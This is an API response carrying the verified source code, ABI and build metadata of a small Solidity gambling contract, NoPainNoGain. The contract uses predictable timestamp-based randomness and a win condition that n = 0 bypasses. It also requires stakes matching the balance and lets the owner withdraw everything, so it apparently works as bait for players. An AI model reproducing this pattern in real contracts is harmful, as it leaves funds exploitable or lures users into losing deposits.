{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.19;\r\ncontract NoPainNoGain {\r\n\r\n    address private Owner = msg.sender;\r\n    \r\n    function NoPainNoGain() public payable {}\r\n    function() public payable {}\r\n   \r\n    function Withdraw() public {\r\n        require(msg.sender == Owner);\r\n        Owner.transfer(this.balance);\r\n    }\r\n    \r\n    function Play(uint n) public payable {\r\n        if(rand(msg.sender) * n < rand(Owner) && msg.value >= this.balance && msg.value > 0.25 ether)\r\n            // You have to risk as much as the contract do\r\n            msg.sender.transfer(this.balance+msg.value);\r\n    }\r\n\t\r\n\tfunction rand(address a) private view returns(uint) {\r\n\t\treturn uint(keccak256(uint(a) + now));\r\n\t}\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"n\",\"type\":\"uint256\"}],\"name\":\"Play\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"NoPainNoGain","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://49b6293734b43e16ec757c98427253062ab836b7b4f0e09cc6dfc1e6915a8f0c"}]}